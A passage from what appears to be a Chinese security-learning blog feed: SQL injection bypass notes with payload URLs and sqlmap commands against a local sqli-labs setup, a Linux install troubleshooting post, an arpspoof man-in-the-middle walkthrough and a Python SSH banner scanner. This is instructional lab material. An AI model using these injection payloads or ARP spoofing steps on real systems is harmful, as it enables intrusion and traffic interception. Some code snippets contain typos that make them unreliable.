id="宽字节的注入"><a href="#宽字节的注入" class="headerlink" title="宽字节的注入"></a>宽字节的注入</h3><p>原理： GBK ：宽字节字符集的一种，Mysql默认字符集,</p><p>GBK占二字节，ASCII占一字节</p><p>php中编码为GBK，函数执行添加的是ASCII编码</p><p>%DF (常用)：会被php 中的addslashes 函数转义为” %DF\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-33/?id=1%df%27" --search --level 3 --risk 1 --thread 10</span><br></pre></td></tr></table></figure><p>其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可；</p><p>GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-32/?id=1" --tamper=unmagicquotes.py</span><br></pre></td></tr></table></figure><h3 id="Access偏移注入"><a href="#Access偏移注入" class="headerlink" title="Access偏移注入"></a>Access偏移注入</h3><p>公式：</p><p>工具：owasp-zap</p><p>access:小型数据库，只存在一个库，库内多个表。</p><h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><p>大小写绕过 </p><p>编码，关键字屏蔽，内联注释</p><p>pathinfo配合dnslog </p><p>原本是id=1 变成1.txt?id=1 </p><h3 id="绕过去除注释的sql注入"><a href="#绕过去除注释的sql注入" class="headerlink" title="绕过去除注释的sql注入"></a>绕过去除注释的sql注入</h3><p>注释符：  –+   –空格    #   /* 多行注释 */</p><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>例：less-23:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>(),<span class="string">'3</span></span><br></pre></td></tr></table></figure><p> 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。</p><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-23/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><p>…</p><h3 id="绕过去除and-or-的sql注入"><a href="#绕过去除and-or-的sql注入" class="headerlink" title="绕过去除and or 的sql注入"></a>绕过去除and or 的sql注入</h3><p>preg_replace()函数来替换字符串或字符数组的莫些字符</p><p>双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-25/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h3 id="绕过去除空格的sql注入"><a href="#绕过去除空格的sql注入" class="headerlink" title="绕过去除空格的sql注入"></a>绕过去除空格的sql注入</h3><p>%09 :Tab </p><p>%0a ：换行</p><p>%20 ：空格 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271</span><br></pre></td></tr></table></figure><p><code>sqlmap</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u "http://127.0.0.1/sqli/Less-27/?id=1" --batch --dbs</span><br></pre></td></tr></table></figure><h2 id="sql漏洞修补"><a href="#sql漏洞修补" class="headerlink" title="sql漏洞修补"></a>sql漏洞修补</h2><ul><li>使用PDO进行加固 </li></ul><p>把查询语句弄成一个对象，通过函数判断输入进来的值是否为数字，然后再通过正则替换内容 使用参数化查询可有效避免SQL注入 </p><ul><li>使用strpos函数在GET输入做判断是否存在关键字</li></ul><p>可以自定义关键字建立数组即可 </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function foo($arg) &#123; #echo $arg; $array = array("and", "or","xxx"); for ($i=0; $i &lt; 2; $i++) &#123; if (strpos($arg,$array[$i])!== false)&#123; die("false"); &#125; &#125; return $arg; &#125;</span><br></pre></td></tr></table></figure><ul><li>使用htmlspecialchars函数在GET输入做一个过滤 </li></ul><h2 id="sql漏洞防御"><a href="#sql漏洞防御" class="headerlink" title="sql漏洞防御"></a>sql漏洞防御</h2><ul><li><p>数据库用户权限分明  </p></li><li><p>代码层防御 常用过滤 </p></li><li><p>str_replace()替换过滤 </p><p>单引号（’） 双引号（”） 反斜杠（\） NULL  </p></li><li><p>htmlspecialchars()函数 实体化过  滤 </p><p>预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ’ （单引号）成为 ’ &lt;&gt;成为 &lt;&gt; 就是把成变成一个纯字符(:з」∠) </p></li><li><p>addslashes()函数 </p></li></ul><p>添加转义字符 会在以下关键词前面添加转义字符 单引号（’） 双引号（”） 反斜杠（\） NULL </p><ul><li><p>输入验证 </p></li><li><p>编码输出  </p></li><li><p>使用PDO预编译语句 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更换Linux系统</title>
      <link href="/categories/Linux/Kali-Linux/%E6%9B%B4%E6%8D%A2Linux%E7%B3%BB%E7%BB%9F/"/>
      <url>/categories/Linux/Kali-Linux/%E6%9B%B4%E6%8D%A2Linux%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>windows 系统更换 Linux（deepin 15.10）系统 ，所遇到的问题。</p><a id="more"></a><h2 id="更换为Linux系统遇到的问题"><a href="#更换为Linux系统遇到的问题" class="headerlink" title="更换为Linux系统遇到的问题"></a>更换为Linux系统遇到的问题</h2><h3 id="问题1：无线网卡无法打开"><a href="#问题1：无线网卡无法打开" class="headerlink" title="问题1：无线网卡无法打开"></a>问题1：无线网卡无法打开</h3><p>首先通过命令查看网卡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rfkill list all</span><br></pre></td></tr></table></figure><p>会显示出 ideapad* 的软件开，硬件关；所以我们关闭它，留下软硬件皆开的。</p><p>移出ideapad无线模块：  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe -r ideapad_laptop</span><br></pre></td></tr></table></figure><p> 写配置文件，开机关闭ideapad无线模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /etc/modprobe.d/ideapad.conf</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/modprobe.d/ideapad.conf</span><br></pre></td></tr></table></figure><p>写入 <code>blacklist ideapad_laptop</code></p><p>如果信号易断，可下载安装无线网卡驱动，下命令可查看无线网卡型号</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep Wireless</span><br></pre></td></tr></table></figure><p><a href="https://github.com/lwfinger/rtlwifi_new" target="_blank" rel="noopener">无线网卡驱动下载地址</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make &amp; make install</span><br></pre></td></tr></table></figure><p><code>enjoy</code>!</p><h3 id="问题2：锁屏界面输入密码无法进入桌面"><a href="#问题2：锁屏界面输入密码无法进入桌面" class="headerlink" title="问题2：锁屏界面输入密码无法进入桌面"></a>问题2：锁屏界面输入密码无法进入桌面</h3><p>原因是因为N卡，禁用即可<br><a href="https://blog.csdn.net/lyfmxy/article/details/53533948" target="_blank" rel="noopener">转载</a></p><h3 id="问题3：制作的启动盘，无法载入"><a href="#问题3：制作的启动盘，无法载入" class="headerlink" title="问题3：制作的启动盘，无法载入"></a>问题3：制作的启动盘，无法载入</h3><p>用这个制作做启动盘<br><strong>Win32DiskImager</strong></p><p><a href="https://www.lanzous.com/i41wx1g" target="_blank" rel="noopener">网盘下载地址</a></p><h3 id="问题4：分区"><a href="#问题4：分区" class="headerlink" title="问题4：分区"></a>问题4：分区</h3><p>新手建议全部给“/”，另外EFI是在UEFI模式下必须要有的分区，给个默认大小分区</p><p>建议你的系统盘之外的盘，采用ntfs文件系统格式<br>系统盘ext4</p><p><strong>enjoy!</strong></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Kali Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>arpspoof工具</title>
      <link href="/categories/%E5%B7%A5%E5%85%B7/arpspoof%E5%B7%A5%E5%85%B7/"/>
      <url>/categories/%E5%B7%A5%E5%85%B7/arpspoof%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗<br><a href="https://www.cnblogs.com/student-programmer/p/6729156.html" target="_blank" rel="noopener">引用</a></p><a id="more"></a><h3 id="中间人流量劫持"><a href="#中间人流量劫持" class="headerlink" title="中间人流量劫持"></a>中间人流量劫持</h3><p><strong>arp欺骗原理概述</strong>：<br>被攻击者：<code>192.168.13.150</code><br>网关：<code>192.168.13.2</code><br>我：<code>192.138.13.151</code><br>arp在网络层，我先打开路由转发，然后进行arp广播，告诉被攻击者，我是网关，被攻击者的arp高速缓存表就会更新，认为我是网关；我告诉网关我是 被攻击者<code>192.168.13.150</code>,网关就会认为我是被攻击者<code>192.168.13.150</code>，最终达到流量劫持。</p><p><strong>单向</strong></p><p>流量：被攻击者-&gt;我-&gt;网关-&gt;被攻击者</p><p>欺骗被攻击主机，首先打开路由转发： </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>执行命令，实现arp欺骗，让被攻击者（192.168.13.151）认为我是网关（192.168.13.2），流量劫持：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.13.151 192.168.13.2</span><br></pre></td></tr></table></figure><p>最后用wireshark,对抓到的包分析。</p><p><strong>双向</strong></p><p>流量：被攻击者-&gt;我-&gt;网关-&gt;我-&gt;被攻击者</p><p><strong>欺骗网关与被攻击主机</strong> </p><p>在单向的基础上，再对网关进行欺骗：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.13.2 192.168.13.151</span><br></pre></td></tr></table></figure><p><strong>欺骗被攻击主机，并作iptable nat转发</strong></p><p>在单向的基础上，用iptables做NAT数据包转发</p><p>此处预留：iptables的链接</p><h3 id="流量捕获与监视"><a href="#流量捕获与监视" class="headerlink" title="流量捕获与监视"></a>流量捕获与监视</h3><p>捕捉图片</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>获取banner脚本</title>
      <link href="/categories/%E8%84%9A%E6%9C%AC/%E8%8E%B7%E5%8F%96banner%E8%84%9A%E6%9C%AC/"/>
      <url>/categories/%E8%84%9A%E6%9C%AC/%E8%8E%B7%E5%8F%96banner%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>python脚本</p><p>banner：分析可知服务是否有漏洞</p><a id="more"></a><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><h3 id="通过sys模块输入的脚本"><a href="#通过sys模块输入的脚本" class="headerlink" title="通过sys模块输入的脚本"></a>通过sys模块输入的脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line">    print(<span class="string">"参数个数不对"</span>)</span><br><span class="line">    print(<span class="string">"例如：./getBanner.py ip.txt"</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBanner</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">2</span>)</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip,port))</span><br><span class="line">        banner=str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> banner</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulns</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    banner=getBanner(ip,port)</span><br><span class="line">    <span class="keyword">if</span> banner:</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'2.3.4'</span> <span class="keyword">in</span> banner):</span><br><span class="line">            print(ip+<span class="string">" vulnerable"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(ip+<span class="string">" unvulnerable"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(ip+<span class="string">" not get banner"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    filename=str(sys.argv[<span class="number">1</span>].strip())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">        print(<span class="string">"指定的不出有你在，重输入"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    port=<span class="number">22</span></span><br><span class="line">    filename=str(sys.argv[<span class="number">1</span>].strip())</span><br><span class="line">    f=open(filename,<span class="string">"r"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">        ip=i.strip(<span class="string">"\n"</span>)</span><br><span class="line">        t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">        t.start()</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="通过os模块输入的脚本"><a href="#通过os模块输入的脚本" class="headerlink" title="通过os模块输入的脚本"></a>通过os模块输入的脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBanner</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">2</span>)</span><br><span class="line">    s=socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip,port))</span><br><span class="line">        banner=str(s.recv(<span class="number">1024</span>))</span><br><span class="line">        s.close()</span><br><span class="line">        <span class="keyword">return</span> banner</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulns</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    banner=getBanner(ip,port)</span><br><span class="line">    <span class="keyword">if</span> banner:</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">'2.3.4'</span> <span class="keyword">in</span> banner):</span><br><span class="line">            print(ip+<span class="string">" vulnerable"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(ip+<span class="string">" unvulnerable"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(ip+<span class="string">" not get banner"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    usage=<span class="string">"Usage: %prog -f &lt;filename&gt; -i &lt;ip address&gt;"</span></span><br><span class="line">    parser=OptionParser(usage=usage)</span><br><span class="line">    parser.add_option(<span class="string">"-f"</span>,<span class="string">"--filename"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"filename"</span>,help=<span class="string">"ip address file"</span>) </span><br><span class="line">    parser.add_option(<span class="string">"-i"</span>,<span class="string">"--ip"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"address"</span>,help=<span class="string">"ip address"</span>)</span><br><span class="line">    (options,args)=parser.parse_args()</span><br><span class="line">    filename=options.filename</span><br><span class="line">    address=options.address</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filename==<span class="literal">None</span> <span class="keyword">and</span> address==<span class="literal">None</span>):</span><br><span class="line">        print(<span class="string">"请指定文件地址或ip地址"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span>(filename):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filename):</span><br><span class="line">            print(<span class="string">"指定的文件不在，重输入"</span>)</span><br><span class="line">            sys.exit()</span><br><span class="line">    </span><br><span class="line">        port=<span class="number">22</span></span><br><span class="line">        f=open(filename,<span class="string">"r"</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">            ip=i.strip(<span class="string">"\n"</span>)</span><br><span class="line">            t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">            t.start()</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">if</span>(address):</span><br><span class="line">        prefix=address.split(<span class="string">"."</span>)[<span class="number">0</span>]+<span class="string">"."</span>+address.split(<span class="string">"."</span>)[<span class="number">1</span>]+<span class="string">"."</span>+address.split(<span class="string">"."</span>)[<span class="number">2</span>]+<span class="string">"."</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">            ip=prefix+str(i)</span><br><span class="line">            port=<span class="number">22</span></span><br><span class="line">            t=Thread(target=checkVulns,args=(ip,port))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="分步讲解"><a href="#分步讲解" class="headerlink" title="分步讲解"></a>分步讲解</h2><h3 id="引用模块socket"><a href="#引用模块socket" class="headerlink" title="引用模块socket"></a>引用模块socket</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socker</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.connect(<span class="string">"192.168.0.12"</span>,<span class="number">21</span>)</span><br><span class="line">result=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h3 id="添加选择"><a href="#添加选择" class="headerlink" title="添加选择"></a>添加选择</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">"ok"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"no"</span>)</span><br></pre></td></tr></table></figure><p><strong>False,0,空值等同；其余皆为True</strong></p><h3 id="添加异常处理"><a href="#添加异常处理" class="headerlink" title="添加异常处理"></a>添加异常处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f=open(<span class="string">"ip.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><a href="https://www.w3cschool.cn/python/python-exceptions.html" target="_blank" rel="noopener">w3c异常处理</a></p><p><a href="https://www.runoob.com/python/python-exceptions.html" target="_blank" rel="noopener">菜鸟异常处理</a></p><h3 id="添加函数"><a href="#添加函数" class="headerlink" title="添加函数"></a>添加函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBanner</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulns</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    ...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    ...</span><br><span class="line"><span class="keyword">if</span> --name--==<span class="string">"main"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>–name–    判断是独立运行还是作为模块被导入</p><h3 id="添加for循环"><a href="#添加for循环" class="headerlink" title="添加for循环"></a>添加for循环</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    ip=<span class="string">"192.168.0."</span>+str(i)</span><br><span class="line">4<span class="keyword">for</span> p <span class="keyword">in</span> [<span class="number">21</span>,<span class="number">22</span>,<span class="number">80</span>]:</span><br><span class="line">    socket=ip+<span class="string">":"</span>+str(p)</span><br><span class="line">44print(socket)</span><br></pre></td></tr></table></figure><p>print()自带换行</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">"ip.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">f.read()</span><br><span class="line">f.write()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><table><thead><tr><th>模式</th><th>作用</th></tr></thead><tbody><tr><td>r</td><td>读取</td></tr><tr><td>w</td><td>文件不存在则创建，存在则清空写入</td></tr><tr><td>a</td><td>追加</td></tr><tr><td></td><td></td></tr></tbody></table><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>write()</td><td>写入，不会加”\n”</td></tr><tr><td>read()</td><td>读取</td></tr><tr><td>resdline()</td><td>按行读</td></tr><tr><td>resdlines()</td><td>一次读取一个列表</td></tr><tr><td>seck()</td><td>指针</td></tr><tr><td>close()</td><td>关闭并保存</td></tr></tbody></table><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h3><p>import 模块名</p><p>from 模块名 import 函数名</p><h3 id="引用sys模块"><a href="#引用sys模块" class="headerlink" title="引用sys模块"></a>引用sys模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br></pre></td></tr></table></figure><p>sys.argv 变量：</p><p>专门用来向Python解释器传递参数</p><p>类似于shell脚本编程中的位置变量</p><p>sys.exit() 方法：</p><p>退出当前程序</p><h3 id="引用os模块"><a href="#引用os模块" class="headerlink" title="引用os模块"></a>引用os模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure><p>os.path.isfile() 是否是文件</p><p>os.path.isdir() 是否是目录</p><p>os.path.exists() 是否存在</p><p>path：类，isfile(): 方法</p><h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">t=Thread(target=要执行的函数，args=(响函数传递的的参数))<span class="comment">#args内的是元祖单个的为（a,）</span></span><br><span class="line">t.start()</span><br></pre></td></tr></table></figure><p>进程是线程的容器，线程是操作系统调度分配处理器时间的基本单位</p><h3 id="引用optparse模块"><a href="#引用optparse模块" class="headerlink" title="引用optparse模块"></a>引用optparse模块</h3><p>设置选项</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">usage=<span class="string">"Usage: %prog -f &lt;filename&gt; -i &lt;address&gt;"</span></span><br><span class="line">parser=OptionParser(usage=usage)</span><br><span 